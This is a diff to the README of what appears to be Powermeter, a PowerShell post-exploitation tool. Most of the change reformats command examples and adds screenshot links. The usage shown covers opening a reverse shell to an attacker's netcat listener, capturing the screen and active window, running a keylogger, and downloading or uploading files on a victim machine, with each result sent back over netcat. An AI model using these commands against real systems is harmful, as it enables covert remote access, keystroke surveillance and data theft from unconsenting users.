@@ -85,16 +85,16 @@ Powermeter>get sysinfo
 
 #### rshell
 
-[prerequisite]:  
-On attacker side> nc -lvp 9191  
+	[prerequisite]:  
+	On attacker side> nc -lvp 9191  
 
-Powermeter>rshell  
-Powermeter>reverse_shell>set LHOST=192.168.214.1  
-[+]LHOST is set  
-Powermeter>reverse_shell>set LPORT=9191  
-[+]LPORT is set  
-Powermeter>reverse_shell>run  
-Powermeter>reverse_shell>[+]TCP reverse shell  
+	Powermeter>rshell  
+	Powermeter>reverse_shell>set LHOST=192.168.214.1  
+	[+]LHOST is set  
+	Powermeter>reverse_shell>set LPORT=9191  
+	[+]LPORT is set  
+	Powermeter>reverse_shell>run  
+	Powermeter>reverse_shell>[+]TCP reverse shell  
 
 ![pm6](https://github.com/mfcekirdek/Powermeter/blob/master/pm6.png "pm6")
 
@@ -115,102 +115,113 @@ Powermeter>reverse_shell>show options
 
 #### stop job -reverseShell (stop job -rs)
 
-Powermeter>stop job -reverseShell  
-[+]ReverseShellJob is terminated..  
+	Powermeter>stop job -reverseShell  
+	[+]ReverseShellJob is terminated..  
 
 ![pm8](https://github.com/mfcekirdek/Powermeter/blob/master/pm8.png "pm8")
 
 #### show jobs
 
-Powermeter>show jobs  
-[+]Active jobs:  
+	Powermeter>show jobs  
+	[+]Active jobs:  
 
-JobStateInfo  : Running  
-Finished      : System.Threading.ManualResetEvent  
-InstanceId    : 50fae208-73d2-4ea0-8f91-0c37597c918b  
-Id            : 5  
-Name          : ReverseShellJob  
-ChildJobs     : {Job6}  
-Output        : {}  
-Error         : {}  
-Progress      : {}  
-Verbose       : {}  
-Debug         : {}  
-Warning       : {}  
-State         : Running  
+	JobStateInfo  : Running  
+	Finished      : System.Threading.ManualResetEvent  
+	InstanceId    : 50fae208-73d2-4ea0-8f91-0c37597c918b  
+	Id            : 5  
+	Name          : ReverseShellJob  
+	ChildJobs     : {Job6}  
+	Output        : {}  
+	Error         : {}  
+	Progress      : {}  
+	Verbose       : {}  
+	Debug         : {}  
+	Warning       : {}  
+	State         : Running  
 
 ![pm9](https://github.com/mfcekirdek/Powermeter/blob/master/pm9.png "pm9")
 
 #### stop job -all
 
-Powermeter>stop job -all  
-[+]ReverseShellJob is terminated..  
-[+]ReceiveFileJob is terminated..  
+	Powermeter>stop job -all  
+	[+]ReverseShellJob is terminated..  
+	[+]ReceiveFileJob is terminated..  
 
 ![pm10](https://github.com/mfcekirdek/Powermeter/blob/master/pm10.png "pm10")
 
 #### screencap -screen
 
-[prerequisite]:  
-On attacker side> nc -lvp 9192 > screenshot.png  
+	[prerequisite]:  
+	On attacker side> nc -lvp 9192 > screenshot.png  
 
-Powermeter>screencap -screen  
-[+]Screenshot saved..  
+	Powermeter>screencap -screen  
+	[+]Screenshot saved..  
 
 ![pm12](https://github.com/mfcekirdek/Powermeter/blob/master/pm12.png "pm12")
 
 ![pm13](https://github.com/mfcekirdek/Powermeter/blob/master/pm13.png "pm13")
 
+![screen](https://github.com/mfcekirdek/Powermeter/blob/master/screenshot.png "screen")
+
 #### screencap -activeWindow
 
-[prerequisite]:   
-On attacker side> nc -lvp 9192 > screenshotActiveWindow.png  
+	[prerequisite]:   
+	On attacker side> nc -lvp 9192 > screenshotActiveWindow.png  
 
-Powermeter>screencap -activeWindow  
-[+]Screenshot is saving..  
+	Powermeter>screencap -activeWindow  
+	[+]Screenshot is saving..  
 
 ![pm14](https://github.com/mfcekirdek/Powermeter/blob/master/pm14.png "pm14")
 
 ![pm24](https://github.com/mfcekirdek/Powermeter/blob/master/pm24.png "pm24")
 
+![activeWindow](https://github.com/mfcekirdek/Powermeter/blob/master/screenshotActiveWindow.png "activeWindow")
+
 #### start keylogger & stop job -keylogger
 
-[prerequisite]:   
-On attacker side> nc -lvp 9192 > log.txt  
+	[prerequisite]:   
+	On attacker side> nc -lvp 9192 > log.txt  
 
-Powermeter>start keylogger  
-[+]KeyLogger is starting..  
-Powermeter>stop job -keylogger  
-[+]Keylogger is terminated..  
+	Powermeter>start keylogger  
+	[+]KeyLogger is starting..  
+	Powermeter>stop job -keylogger  
+	[+]Keylogger is terminated..  
 
 ![pm15](https://github.com/mfcekirdek/Powermeter/blob/master/pm15.png "pm15")
 
 ![pm19](https://github.com/mfcekirdek/Powermeter/blob/master/pm19.png "pm19")
 
+![log](https://github.com/mfcekirdek/Powermeter/blob/master/log.png "log")
+
 #### download <file>
 
-[prerequisite]:   
-On attacker side> nc -lvp 9192 > downloadedFile  
+	[prerequisite]:   
+	On attacker side> nc -lvp 9192 > downloadedFile  
 
-Powermeter>download C:\Users\decoder\Desktop\cozbeni.zip  
-[+]File is downloading..  
+	Powermeter>download C:\Users\decoder\Desktop\cozbeni.zip  
+	[+]File is downloading..  
 
 ![pm18](https://github.com/mfcekirdek/Powermeter/blob/master/pm18.png "pm18")
 
 ![pm25](https://github.com/mfcekirdek/Powermeter/blob/master/pm25.png "pm25")
 
+Downloaded file:
+![pm17](https://github.com/mfcekirdek/Powermeter/blob/master/pm17.png "pm17")
+
 #### upload <file>
 
-[prerequisite]:   
-On attacker side> nc -lvp 9192 \< uploadedFile  
+	[prerequisite]:   
+	On attacker side> nc -lvp 9192 \< uploadedFile  
 
-Powermeter>upload C:\Users\decoder\Desktop\img.jpg  
-[+]File is uploading..  
+	Powermeter>upload C:\Users\decoder\Desktop\img.jpg  
+	[+]File is uploading..  
 
 ![pm20](https://github.com/mfcekirdek/Powermeter/blob/master/pm20.png "pm20")
 
 ![pm22](https://github.com/mfcekirdek/Powermeter/blob/master/pm22.png "pm22")
 
+Uploaded file:
+![pm21](https://github.com/mfcekirdek/Powermeter/blob/master/pm21.png "pm21")
 
 A quick demo video
 =============
